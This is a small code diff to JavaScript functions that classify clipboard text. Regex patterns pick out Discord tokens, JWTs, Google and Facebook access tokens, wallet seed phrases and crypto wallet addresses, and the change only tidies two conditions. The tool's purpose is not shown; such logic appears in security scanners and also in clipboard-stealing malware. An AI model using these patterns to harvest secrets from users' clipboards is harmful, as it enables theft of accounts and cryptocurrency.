@@ -110,7 +110,6 @@ function isLikelyStandaloneToken(value) {
   if (!text || text.length < 6 || /\s/.test(text)) return false;
   if (DISCORD_TOKEN_PATTERN.test(text) || JWT_TOKEN_PATTERN.test(text) || /^1\/\//.test(text) || /^EAAB/i.test(text)) return true;
   if (/^[A-F0-9]{8,}$/i.test(text)) return true;
-  if (/^[A-Za-z0-9._-]{8,}$/.test(text)) return true;
   return /^[A-Za-z0-9._:-]{8,}$/.test(text);
 }
 
@@ -554,7 +553,7 @@ function classifyClipboardEntry(text, urls) {
   const compact = text.trim();
   const lower = compact.toLowerCase();
 
-  if (/^(?:[a-z]+(?:\s+[a-z]+){11,23})$/i.test(compact) && compact.split(/\s+/).length >= 12) {
+  if (/^(?:[a-z]+(?:\s+[a-z]+){11,23})$/i.test(compact)) {
     return 'Seed Phrase';
   }
   if (/^(?:0x[a-f0-9]{40}|bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|T[1-9A-HJ-NP-Za-km-z]{33})$/i.test(compact)) {
